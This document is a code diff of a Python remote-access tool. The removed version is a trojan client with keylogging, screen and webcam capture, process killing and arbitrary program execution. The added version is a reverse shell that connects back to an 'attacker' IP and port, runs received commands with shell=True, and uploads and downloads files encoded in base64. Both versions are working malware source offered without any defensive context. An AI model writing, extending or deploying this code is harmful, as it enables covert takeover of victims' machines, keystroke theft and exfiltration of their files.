@@ -1,86 +1,119 @@
 import socket
-import os
 import subprocess
-import psutil
-import keyboard
-import win10toast
-import cv2
-import mss
-import threading
+import os
+import json
+import base64
 
-keylog = []
-key_monitoring = False
 
-def grab_key():
-    return "Placeholder for Windows Key grabbing logic"
+# Function to execute commands on the target machine
+def execute_command(command):
+    # Execute the command and return the result
+    return subprocess.run(command, shell=True, capture_output=True)
 
-def key_monitor():
-    global key_monitoring, keylog
-    while key_monitoring:
-        key = keyboard.read_event()
-        if key.event_type == keyboard.KEY_DOWN and key.name not in ["ctrl", "alt", "shift"]:
-            if key.name == "enter":
-                keylog.append("[ENTER]")
-            elif key.name == "space":
-                keylog.append(" ")
-            else:
-                keylog.append(key.name)
+# Create a socket object to connect back to the attacker
+HOST = "127.0.0.1"  # Replace with the attacker's IP address
+PORT = 4444  # Replace with the port the attacker is listening on
 
-def stream_screen_and_webcam():
-    with mss.mss() as sct:
-        webcam = cv2.VideoCapture(0)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Attempt to connect to the attacker's server
+try:
+    sock.connect((HOST, PORT))
+
+    # Send an initial message to show the connection is established
+    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))
+
+    default_prompt = "admin@medusax~$ "
+    current_prompt = default_prompt
+    in_shell_mode = False  # Tracks whether the client is in shell mode
+
+    def send_json(data):
+        json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
+        sock.send(json_data.encode())  # Encode to bytes before sending
+
+    def receive_json():
+        json_data = ""
         while True:
-            screen = sct.shot(output="screen.png")
-            ret, frame = webcam.read()
-            if ret:
-                cv2.imshow("Webcam", frame)
-                if cv2.waitKey(1) & 0xFF == ord("q"):
-                    break
-        webcam.release()
-        cv2.destroyAllWindows()
+            try:
+                json_data = json_data + sock.recv(1024).decode()  # Decode bytes to string
+                return json.loads(json_data)  # Return full file till the end of string/dat
+            except ValueError:
+                continue
 
-def client_operations(conn):
-    global key_monitoring, keylog
+    def read_file(path):
+        with open(path, "rb") as file:  # RB for readable binary file
+            return base64.b64encode(file.read()).decode()  # Decode bytes to string
+
+    def write_file(path, content):
+        with open(path, "wb") as file:  # WB for writable binary file
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful [+]"
+
     while True:
-        command = conn.recv(1024).decode()
-        if command.startswith("ps"):
-            processes = "\n".join([p.name() for p in psutil.process_iter()])
-            conn.send(processes.encode())
-        elif command.startswith("reboot"):
-            os.system("shutdown /r /t 1")
-        elif command.startswith("kill"):
-            pid = int(command.split()[1])
-            psutil.Process(pid).terminate()
-        elif command.startswith("execute"):
-            args = command.split()
-            filename = args[1]
-            arguments = args[2:] if len(args) > 2 else []
-            subprocess.Popen([filename] + arguments)
-        elif command.startswith("stream"):
-            threading.Thread(target=stream_screen_and_webcam).start()
-        elif command.startswith("keymon set on"):
-            key_monitoring = True
-            threading.Thread(target=key_monitor).start()
-        elif command.startswith("keymon dump"):
-            conn.send("".join(keylog).encode())
-        elif command.startswith("keymon set off"):
-            key_monitoring = False
-        elif command.startswith("alert"):
-            args = command.split()
-            name = args[1]
-            text = args[3]
-            duration = int(args[5])
-            toaster = win10toast.ToastNotifier()
-            toaster.show_toast(name, text, duration=duration)
-        else:
-            conn.send(b"Unknown command")
+        # Send the current prompt to the server
+        sock.sendall(current_prompt.encode("utf-8"))
 
-def main():
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect(("10.0.1.33", 9999))  # Replace 'server_ip' with server's IP
-    client.send(f"OS: {os.name} {os.version}\n".encode())
-    client.send(f"Windows Key: {grab_key()}\n".encode())
-    client_operations(client)
+        # Receive the command from the server
+        command = sock.recv(1024).decode("utf-8").strip()
 
-if __name__ == "__main__":
-    main()
+        # Handle the 'km' command to completely disconnect
+        if command.lower() == "km":
+            sock.sendall("Disconnecting...\n".encode("utf-8"))
+            sock.close()
+            break
+
+        # Handle the 'shell' command to enter the shell mode
+        if command.lower() == "shell":
+            try:
+                os.chdir("C:\\")
+                in_shell_mode = True  # Enable shell mode
+                current_prompt = f"{os.getcwd()} > "
+                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
+            except Exception as e:
+                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
+            continue
+
+        # Handle the 'shell -d <directory>' command to set a specific directory
+        if command.startswith("shell -d"):
+            try:
+                _, _, directory = command.partition("-d")
+                directory = directory.strip()
+                os.chdir(directory)  # Change to the specified directory
+                in_shell_mode = True  # Enable shell mode
+                current_prompt = f"{os.getcwd()} > "
+                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
+            except Exception as e:
+                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
+            continue
+
+        # If in shell mode, process shell commands
+        if in_shell_mode:
+            if command.lower() == "exit":
+                # Exit the shell and return to the default prompt
+                in_shell_mode = False  # Disable shell mode
+                current_prompt = default_prompt
+                sock.sendall("Exiting remote shell mode.\n".encode("utf-8"))
+                continue
+
+            # Execute the received shell command
+            output = execute_command(command)
+            sock.sendall(output.stdout + output.stderr)
+            continue
+
+        # Handle 'download' and 'upload' commands
+        if command.startswith("download"):
+            file_path = command.split(" ")[1]
+            send_json(["download", file_path, read_file(file_path)])
+
+        elif command.startswith("upload"):
+            file_path = command.split(" ")[1]
+            file_content = receive_json()
+            write_file(file_path, file_content[2])  # File content at index 2
+            print("[+] File uploaded successfully [+]")
+
+        # If not in shell mode, reject commands other than 'shell' or 'shell -d'
+        sock.sendall("Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect.\n".encode("utf-8"))
+
+except Exception as e:
+    print(f"Error: {e}")
+    sock.close()
